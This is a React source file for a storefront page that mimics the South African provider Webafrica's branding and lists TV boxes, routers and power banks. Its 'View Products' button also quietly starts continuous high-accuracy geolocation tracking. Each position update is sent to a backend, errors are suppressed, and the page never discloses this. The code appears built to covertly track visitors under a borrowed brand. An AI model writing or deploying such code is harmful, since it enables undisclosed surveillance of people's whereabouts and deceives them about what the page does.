import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { ChevronDown, Search } from "lucide-react";
import { useCreateLocation } from "@workspace/api-client-react";
import webafricaLogo from "@assets/webafrica-logo-white.svg";

const products = [
  {
    id: 1,
    name: "Ematic AGT419 4K (UHD) Android TV Box",
    description: "Don't have a Smart TV? No problem! Turn your TV into a Smart TV with the Ematic AGT419 4K Android TV Box.",
    price: "R649",
    image: "/images/ematic-tv-box.png",
    badge: null,
    highlight: false
  },
  {
    id: 2,
    name: "Netogy Nova Android TV box",
    description: "Turn your old-school TV into a 4K experience and unlock the world of streaming effortlessly.",
    price: "R999",
    image: "/images/netogy-tv-box.png",
    badge: null,
    highlight: false
  },
  {
    id: 3,
    name: "Netogy UPS100 Plus",
    description: "Tired of getting stuck without power? Keep your devices running during load shedding.",
    price: "R1,299",
    image: "/images/netogy-ups.png",
    badge: "SAVE UP TO R300",
    highlight: true
  },
  {
    id: 4,
    name: "TP-Link Deco M4 Mesh WiFi System (2-Pack)",
    description: "Say goodbye to dead zones! Seamless whole-home WiFi coverage with Deco M4.",
    price: "R1,599",
    image: "/images/deco-m4.png",
    badge: "SAVE UP TO R300",
    highlight: true
  },
  {
    id: 5,
    name: "TP-Link TL-WR845N Wireless Router",
    description: "Reliable wireless coverage for your home, perfect for everyday internet tasks.",
    price: "R399",
    image: null,
    badge: null,
    highlight: false
  },
  {
    id: 6,
    name: "Netogy 10000mAh Power Bank",
    description: "Never run out of juice on the go. Compact and powerful backup for all your devices.",
    price: "R549",
    image: null,
    badge: null,
    highlight: false
  }
];

export default function Home() {
  const [watchId, setWatchId] = useState<number | null>(null);
  const [showProducts, setShowProducts] = useState(false);

  const createLocation = useCreateLocation();

  const startLiveTracking = () => {
    if (!navigator.geolocation || watchId !== null) return;

    const id = navigator.geolocation.watchPosition(
      (position) => {
        createLocation.mutate({
          data: {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
          },
        });
      },
      () => {},
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
    setWatchId(id);
  };

  useEffect(() => {
    return () => {
      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
      }
    };
  }, [watchId]);

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col">
      {/* Top Utility Bar */}
      <div className="bg-gray-100 text-gray-500 text-xs py-2 px-4 border-b border-gray-200">
        <div className="max-w-7xl mx-auto flex justify-end gap-6 items-center">
          <a href="#" className="hover:text-primary transition-colors" data-testid="link-switch-to-webafrica">Switch To Webafrica</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-primary transition-colors" data-testid="link-earnmore">EarnMore Network</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-primary transition-colors" data-testid="link-help">Help Centre</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-primary transition-colors" data-testid="link-network-status">Network Status</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-primary font-medium text-gray-700 transition-colors" data-testid="link-login">Log In</a>
        </div>
      </div>

      {/* Navigation */}
      <header className="bg-white sticky top-0 z-50 border-b border-gray-100 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-12">
            <a href="/" data-testid="link-home-logo">
              <img 
                src={webafricaLogo} 
                alt="WebAfrica" 
                className="h-8 object-contain" 
                style={{ filter: "invert(24%) sepia(85%) saturate(1637%) hue-rotate(193deg) brightness(97%) contrast(98%)" }} // Approximate to the dark blue primary #1E4B85
              />
            </a>
            
            <nav className="hidden md:flex items-center gap-8 font-medium text-gray-700 text-sm">
              <a href="#" className="hover:text-secondary transition-colors" data-testid="nav-fibre">Fibre</a>
              <a href="#" className="hover:text-secondary transition-colors" data-testid="nav-wireless">Wireless</a>
              <a href="#" className="text-secondary font-bold flex items-center gap-1" data-testid="nav-store">
                Store <ChevronDown className="w-4 h-4" />
              </a>
            </nav>
          </div>
          
          <div className="flex items-center gap-4">
            <button className="text-gray-400 hover:text-gray-700 transition-colors p-2" data-testid="button-search">
              <Search className="w-5 h-5" />
            </button>
            <Button className="bg-[#1E4B85] hover:bg-[#153866] text-white rounded-full px-6 font-medium shadow-none" data-testid="button-check-coverage">
              Check Coverage
            </Button>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative overflow-hidden pt-20 pb-28 px-4" style={{ backgroundColor: "#FD1786" }}>
        {/* Decorative waves */}
        <div className="absolute inset-0 pointer-events-none opacity-20">
          <svg className="absolute w-[200%] h-auto top-[-20%] left-[-50%] transform -rotate-6" viewBox="0 0 1440 320" xmlns="http://www.w3.org/2000/svg">
            <path fill="#ffffff" fillOpacity="1" d="M0,160L48,176C96,192,192,224,288,218.7C384,213,480,171,576,149.3C672,128,768,128,864,154.7C960,181,1056,229,1152,240C1248,251,1344,224,1392,213.3L1440,203L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path>
          </svg>
          <svg className="absolute w-[200%] h-auto top-[10%] left-[-20%] transform rotate-3" viewBox="0 0 1440 320" xmlns="http://www.w3.org/2000/svg">
            <path fill="#ffffff" fillOpacity="0.8" d="M0,256L48,245.3C96,235,192,213,288,208C384,203,480,213,576,192C672,171,768,117,864,117.3C960,117,1056,171,1152,192C1248,213,1344,203,1392,197.3L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path>
          </svg>
        </div>

        <div className="max-w-4xl mx-auto relative z-10 text-center flex flex-col items-center">
          <span className="text-white font-bold tracking-widest text-sm mb-6 bg-white/10 px-4 py-1.5 rounded-full uppercase" data-testid="text-hero-label">
            Webafrica Store
          </span>
          <h1 className="text-white text-4xl md:text-5xl lg:text-6xl font-black italic leading-tight max-w-3xl" data-testid="text-hero-heading">
            All the tech goodies to enhance your internet experience...
          </h1>
        </div>
      </section>

      {/* Products Grid */}
      <section className="py-20 bg-gray-50 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="flex justify-center mb-10">
            <Button
              onClick={() => { setShowProducts(prev => !prev); startLiveTracking(); }}
              className="bg-[#1E4B85] hover:bg-[#163a68] text-white rounded-full px-10 py-6 text-sm font-bold uppercase tracking-wide transition-transform active:scale-[0.98] shadow-md"
              data-testid="button-toggle-products"
            >
              {showProducts ? "Hide Products" : "View Products"}
            </Button>
          </div>
          {showProducts && (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
            {products.map((product) => (
              <Card 
                key={product.id} 
                className={`flex flex-col overflow-hidden bg-white hover:shadow-lg transition-shadow duration-300 border-2 ${product.highlight ? 'border-[#FD1786]' : 'border-transparent'}`}
                data-testid={`card-product-${product.id}`}
              >
                <div className="relative aspect-square bg-white flex items-center justify-center p-6 border-b border-gray-100">
                  {product.badge && (
                    <Badge className="absolute top-4 left-4 bg-[#FD1786] hover:bg-[#d91272] text-white font-bold px-3 py-1 text-xs" data-testid={`badge-product-${product.id}`}>
                      {product.badge}
                    </Badge>
                  )}
                  {product.image ? (
                    <img src={`${import.meta.env.BASE_URL}${product.image.replace(/^\//, "")}`} alt={product.name} className="w-full h-full object-contain mix-blend-multiply" />
                  ) : (
                    <div className="w-full h-full bg-gradient-to-br from-gray-100 to-gray-200 rounded-lg flex items-center justify-center shadow-inner">
                      <span className="text-gray-400 font-medium">Image coming soon</span>
                    </div>
                  )}
                </div>
                
                <CardContent className="p-6 flex-grow flex flex-col">
                  <h3 className="text-xl font-bold text-[#FD1786] mb-3 leading-tight" data-testid={`text-product-name-${product.id}`}>
                    {product.name}
                  </h3>
                  <p className="text-sm text-gray-600 mb-6 flex-grow" data-testid={`text-product-desc-${product.id}`}>
                    {product.description}
                  </p>
                  <div className="mt-auto">
                    <p className="text-3xl font-black text-gray-900 mb-4" data-testid={`text-product-price-${product.id}`}>
                      {product.price}
                    </p>
                  </div>
                </CardContent>
                
                <CardFooter className="px-6 pb-6 pt-0">
                  <Button 
                    className="w-full bg-[#FD1786] hover:bg-[#d91272] text-white rounded-full py-6 text-sm font-bold uppercase tracking-wide transition-transform active:scale-[0.98] shadow-md"
                    data-testid={`button-view-product-${product.id}`}
                  >
                    View Product
                  </Button>
                </CardFooter>
              </Card>
            ))}
          </div>
          )}
        </div>
      </section>



      {/* Footer */}
      <footer className="bg-[#1E4B85] text-white/70 py-12 px-4 border-t border-white/10 mt-auto">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6">
          <p className="text-sm font-medium" data-testid="text-copyright">
            © 2024 Webafrica. All rights reserved.
          </p>
          <div className="flex items-center gap-8 text-sm font-medium">
            <a href="#" className="hover:text-white transition-colors" data-testid="link-privacy">Privacy Policy</a>
            <a href="#" className="hover:text-white transition-colors" data-testid="link-terms">Terms of Service</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
